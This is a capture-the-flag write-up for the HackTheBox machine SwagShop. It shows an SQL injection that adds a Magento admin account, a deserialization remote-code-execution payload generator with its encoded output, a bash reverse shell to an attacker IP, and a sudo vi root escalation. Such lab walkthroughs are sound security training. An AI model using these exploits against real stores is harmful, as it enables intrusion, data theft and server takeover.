# SwagShop - Linux, easu (10.10.10.140)

### Enumeration
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://swagshop.htb/
```

Add `10.10.10.140 swagshop.htb` in `/etc/hosts` in order to view the content of the website.
This is due to the fact that the server is using Virtual Host routing.

The site is an e-commerce shopping website and it is cleaely based on **Magento** framework.
To enumerate it, download magescan.phar from [Magescan](https://github.com/steverobbins/magescan) and run `php magescan.phar scan:all http://swagshop.htb`
```
+-----------+------------------+
| Parameter | Value            |
+-----------+------------------+
| Edition   | Community        |
| Version   | 1.9.0.0, 1.9.0.1 |
+-----------+------------------+

+----------------------------------------------+---------------+--------+
| Path                                         | Response Code | Status |
+----------------------------------------------+---------------+--------+
| app/etc/local.xml                            | 200           | Fail   |
| index.php/rss/order/NEW/new                  | 200           | Fail   |
| shell/                                       | 200           | Fail   |
```

In **app/etc/local.xml** we can find DB credentials:
```
DB: mysql4
Username: root
Password: fMVWh7bDHpgZkyfqQXreTjU9
```

Searching for vulnerabilities, an interesting one that allows for arbitrary SQL command execution is [CVE-2015-1397](https://www.cvedetails.com/cve/CVE-2015-1397/).
There is POC on the internet for this vulnerability [Magento Shoplift](https://github.com/joren485/Magento-Shoplift-SQLI).

Looking at the script, we can see that it utilizes prepared statements to insert values in the admin tables:
```
# For demo purposes, I use the same attack as is being used in the wild
SQLQUERY="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""
```

And then, it injects it into the **popularity** parameter:
```
# Put the nice readable queries into one line,
# and insert the username:password combinination
query = SQLQUERY.replace("\n", "").format(username="ypwq", password="123")
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
```

If we download the script and edit the username and password with something of our choice that will be set for the admin user and then run it we obtain:
```
kali@kali:~/HackTheBox/retired/Linux/easy/SwagShop$ python get_admin.py http://swagshop.htb
WORKED
Check http://swagshop.htb/admin with creds hollow:1234
```

Using these credentials we can log into the admin panel (remember that in the URL obtained we need to add index.php before /admin).

### Obtaining www-data
Googling for exploits regarding the admin panel of Magento, we can find [this](https://gist.github.com/falcononrails/e754505f9339b5fa905c2dc8f0f3adf4), which is an authenticated RCE exploit. Unfortunately, the exploit does not work out of the box, so we can try to understand how it works and modify it in order to make it work for our case.

First things first, we need to change the install date as specified:
```
# Config.
username = ''
password = ''
php_function = 'system'  # Note: we can only pass 1 argument to the function
install_date = 'Sat, 15 Nov 2014 20:27:57 +0000'  # This needs to be the exact date from /app/etc/local.xml
```

Just use `curl http://swagshop.htb/app/etc/local.xml | grep date` to get it.

Then, the scripts creates a mechanize browser object and then logs the user in:
```
request = br.open(target)

br.select_form(nr=0)
br.form.new_control('text', 'login[username]', {'value': username})  # Had to manually add username control.
br.form.fixup()
br['login[username]'] = username
br['login[password]'] = password
```

Then, it finds the **ajaxBlockUrl** and **form_key** values:
```
url = re.search("ajaxBlockUrl = \'(.*)\'", content)
url = url.group(1)
key = re.search("var FORM_KEY = '(.*)'", content)
key = key.group(1)
```

We can see these values by looking at the source code of the dashboard page:
```
ajaxBlockUrl = 'http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/2b38856023fbf58a55cd99129d2fe6af/' + ajaxBlockParam + periodParam;
var FORM_KEY = 'dyoaiutozL0JXZBr';
```

And then it creates an URL by concatenating the information obtained:
```
request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
tunnel = re.search("src=\"(.*)\?ga=", request.read())
tunnel = tunnel.group(1)
```

So, the result should be `http://swagshop.htb/index.php/admin/dashboard/ajaxBlock/key/2b38856023fbf58a55cd99129d2fe6af/block/tab_orders/period/7d/?isAjax=true`, and the POST data `isAjax=false&form_key=dyoaiutozL0JXZBr`.

We can try to make this request with Burpsuite:
```
GET /index.php/admin/dashboard/ajaxBlock/key/2b38856023fbf58a55cd99129d2fe6af/block/tab_orders/period/7d/?isAjax=true HTTP/1.1
Host: swagshop.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: adminhtml=a7borrv8m0icn3ib7fnn6i7t46
Upgrade-Insecure-Requests: 1
Content-Length: 38

isAjax=false&form_key=dyoaiutozL0JXZBr
```

Requesting the page with 7d as time period does not provide any useful data (the tunnel), but changing it into **2y** in the request we can observe the tunnel link which the exploit is looking for:
```
 <option value="2y" >2YTD</option>
            </select></p><br/>
            <p style="width:587px;height:300px; margin:0 auto;"><img src="http://swagshop.htb/index.php/admin/dashboard/tunnel/key/1d385e58088cf68d5cbf1fd9ba6eaa49/?ga=YTo5OntzOjM6ImNodCI7czoyOiJsYyI7czozOiJjaGYiO3M6Mzk6ImJnLHMsZjRmNGY0fGMsbGcsOTAsZmZmZmZmLDAuMSxlZGVkZWQsMCI7czozOiJjaG0iO3M6MTQ6IkIsZjRkNGIyLDAsMCwwIjtzOjQ6ImNoY28iO3M6NjoiZGI0ODE0IjtzOjM6ImNoZCI7czo1MDoiZTpBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBdTdBQUFBQUFBQUFBQUEiO3M6NDoiY2h4dCI7czozOiJ4LHkiO3M6NDoiY2h4bCI7czo4MDoiMDp8fHwwMDowMHx8fDAzOjAwfHx8MDY6MDB8fHwwOTowMHx8fDEyOjAwfHx8MTU6MDB8fHwxODowMHx8fDIxOjAwfDE6fDB8MTB8MjB8MzAiO3M6MzoiY2hzIjtzOjc6IjU4N3gzMDAiO3M6MzoiY2hnIjtzOjM1OiI0LjM0NzgyNjA4Njk1NjUsMzMuMzMzMzMzMzMzMzMzLDEsMCI7fQ%253D%253D&h=bc53871ed0918b10391b6e482f30853e" alt="chart" title="chart" /></p>
```
At this point, we can copy the payload generation part of the script to generate the `payload` and the `gh` values:
```
#!/usr/bin/python
import base64
from hashlib import md5

php_function = 'system'
install_date = 'Wed, 08 May 2019 07:23:09 +0000'
arg = "whoami"

# POP chain to pivot into call_user_exec
payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
'\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"' \
'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00' \
'_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function, len(arg), arg)

payload = base64.b64encode(payload)
gh = md5(payload + install_date).hexdigest()

print "payload: " + payload
print "gh: " + gh
```

Output:
```
payload: Tzo4OiJaZW5kX0xvZyI6MTp7czoxMToiACoAX3dyaXRlcnMiO2E6Mjp7aTowO086MjA6IlplbmRfTG9nX1dyaXRlcl9NYWlsIjo0OntzOjE2OiIAKgBfZXZlbnRzVG9NYWlsIjthOjM6e2k6MDtzOjExOiJFWFRFUk1JTkFURSI7aToxO3M6MTI6IkVYVEVSTUlOQVRFISI7aToyO3M6MTU6IkVYVEVSTUlOQVRFISEhISI7fXM6MjI6IgAqAF9zdWJqZWN0UHJlcGVuZFRleHQiO047czoxMDoiACoAX2xheW91dCI7TzoyMzoiWmVuZF9Db25maWdfV3JpdGVyX1lhbWwiOjM6e3M6MTU6IgAqAF95YW1sRW5jb2RlciI7czo2OiJzeXN0ZW0iO3M6MTc6IgAqAF9sb2FkZWRTZWN0aW9uIjtOO3M6MTA6IgAqAF9jb25maWciO086MTM6IlZhcmllbl9PYmplY3QiOjE6e3M6ODoiACoAX2RhdGEiO3M6Njoid2hvYW1pIjt9fXM6ODoiACoAX21haWwiO086OToiWmVuZF9NYWlsIjowOnt9fWk6MTtpOjI7fX0=
gh: ac45fbaa8e4537ac82f346ea37f7ce86
```

Now, sending the request using Burp to `http://swagshop.htb/index.php/admin/dashboard/tunnel/key/1d385e58088cf68d5cbf1fd9ba6eaa49/?ga=Tzo4OiJaZW5kX0xvZyI6MTp7czoxMToiACoAX3dyaXRlcnMiO2E6Mjp7aTowO086MjA6IlplbmRfTG9nX1dyaXRlcl9NYWlsIjo0OntzOjE2OiIAKgBfZXZlbnRzVG9NYWlsIjthOjM6e2k6MDtzOjExOiJFWFRFUk1JTkFURSI7aToxO3M6MTI6IkVYVEVSTUlOQVRFISI7aToyO3M6MTU6IkVYVEVSTUlOQVRFISEhISI7fXM6MjI6IgAqAF9zdWJqZWN0UHJlcGVuZFRleHQiO047czoxMDoiACoAX2xheW91dCI7TzoyMzoiWmVuZF9Db25maWdfV3JpdGVyX1lhbWwiOjM6e3M6MTU6IgAqAF95YW1sRW5jb2RlciI7czo2OiJzeXN0ZW0iO3M6MTc6IgAqAF9sb2FkZWRTZWN0aW9uIjtOO3M6MTA6IgAqAF9jb25maWciO086MTM6IlZhcmllbl9PYmplY3QiOjE6e3M6ODoiACoAX2RhdGEiO3M6Njoid2hvYW1pIjt9fXM6ODoiACoAX21haWwiO086OToiWmVuZF9NYWlsIjowOnt9fWk6MTtpOjI7fX0=&h=ac45fbaa8e4537ac82f346ea37f7ce86` we should see in the response `www-data`.

The final versio of the modified script can be found in this repo.

Now, we can execute:
```
kali@kali:~/HackTheBox/retired/Linux/easy/SwagShop$ python2 my_exploit.py http://swagshop.htb/index.php/admin whoami
www-data
```

So it works, now get a shell!

```
kali@kali:~/HackTheBox/retired/Linux/easy/SwagShop$ python2 my_exploit.py http://swagshop.htb/index.php/admin "bash -c 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1'"

kali@kali:~/HackTheBox/retired/Linux/easy/SwagShop$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.140] 56534
bash: cannot set terminal process group (1377): Inappropriate ioctl for device
bash: no job control in this shell
www-data@swagshop:/var/www/html$ 
```

### From www-data to Root
```
www-data@swagshop:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

We can run `vi` as root when editing a file in `/var/www/html`.

Execute `sudo /usr/bin/vi /var/www/html/test` and then on vim press `ESC` and then write `:!/bin/sh` to spawna shell:
```
id
uid=0(root) gid=0(root) groups=0(root)
```

Now you can get the root flag!
